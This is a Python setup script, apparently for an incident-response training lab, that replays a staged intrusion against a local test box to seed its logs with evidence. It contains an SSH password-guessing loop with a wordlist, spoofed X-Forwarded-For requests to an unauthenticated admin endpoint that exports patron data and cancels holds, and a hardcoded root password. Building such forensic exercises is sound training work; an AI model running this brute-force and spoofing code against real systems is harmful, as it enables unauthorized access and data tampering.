#!/usr/bin/env python3
"""Lantern Hill prep 90 -- the attacker replay ("the night it happened").

Run as root AFTER 01-05 and BEFORE the nakon plant step (the plants are the
attacker's OS-level persistence; this script is the attacker's *activity*).
It stages the whole intrusion story into the box's four evidence sources
with one consistent attacker address:

  1. `203.0.113.7/32` is aliased onto `lo`, so real connections sourced
     from that address are possible and every log line carries it.
  2. A password-guessing run against sshd via paramiko: four failures,
     then the successful password login for the compromised account --
     recorded by sshd into the journal and (via rsyslog) the flat auth log,
     plus wtmp/btmp.
  3. An HTTP session against the catalog through apache with a spoofed
     X-Forwarded-For: recon, a patrons export, then three hold-cancelling
     calls to the unauthenticated admin hook -- recorded by
     `journalctl -u library-app`, with the resulting SELECT/UPDATE
     statements in /var/log/mysql/general.log.

Everything here is read-only on box state except the holds rows it flips
(that is the point: the data is really tampered) and the loopback alias
(not persistent across reboot; the logs persist, which is all IR needs).
"""
import subprocess
import sys
import time
import urllib.request

ATTACKER_IP = "203.0.113.7"
PATRON_IP = "198.51.100.23"          # an innocent bystander for contrast
ROOT_PW = "LanternHill2026!"          # prep02 set this; the "leaked" password

SSH_ATTEMPTS = [
    ("root", "password123"),
    ("root", "winter2025"),
    ("librarian", "librarian"),       # the one that lands: the staff
                                      # account's password IS its name
    ("root", "summer2024"),
    ("root", ROOT_PW),
]

HTTP_SESSION = [
    (PATRON_IP, "/"),
    (PATRON_IP, "/holds"),
    (ATTACKER_IP, "/"),
    (ATTACKER_IP, "/admin/patrons/export"),
    (ATTACKER_IP, "/admin/holds/update?hold_id=1&status=CANCELLED"),
    (ATTACKER_IP, "/admin/holds/update?hold_id=3&status=CANCELLED"),
    (ATTACKER_IP, "/admin/holds/update?hold_id=5&status=CANCELLED"),
    (PATRON_IP, "/holds"),            # a patron notices their hold is gone
]


def alias_attacker_ip():
    subprocess.run(
        ["ip", "addr", "add", f"{ATTACKER_IP}/32", "dev", "lo"],
        capture_output=True,
    )


def ssh_brute_force():
    import paramiko

    ok = None
    for user, password in SSH_ATTEMPTS:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=ATTACKER_IP,
                port=22,
                username=user,
                password=password,
                timeout=10,
                allow_agent=False,
                look_for_keys=False,
            )
            print(f"replay: ssh {user}@{ATTACKER_IP} ACCEPTED ({password!r})")
            ok = (user, password)
            client.close()
            break
        except paramiko.AuthenticationException:
            print(f"replay: ssh {user}@{ATTACKER_IP} failed ({password!r})")
        finally:
            client.close()
        time.sleep(0.4)
    if ok is None:
        print("replay: WARNING -- no ssh attempt succeeded; is the weak "
              "sshd drop-in live and the password set?", file=sys.stderr)
    return ok


def http_session():
    for ip, path in HTTP_SESSION:
        req = urllib.request.Request(
            "http://127.0.0.1" + path, headers={"X-Forwarded-For": ip}
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                resp.read()
                print(f"replay: http {ip} {path} -> {resp.status}")
        except Exception as exc:  # noqa: BLE001
            print(f"replay: http {ip} {path} ERROR: {exc}", file=sys.stderr)
        time.sleep(0.4)


def main():
    alias_attacker_ip()
    ssh_brute_force()
    http_session()
    print("replay: done. Evidence now lives in the journal (sshd + "
          "library-app), the flat auth log, wtmp/btmp, and "
          "/var/log/mysql/general.log.")


if __name__ == "__main__":
    main()
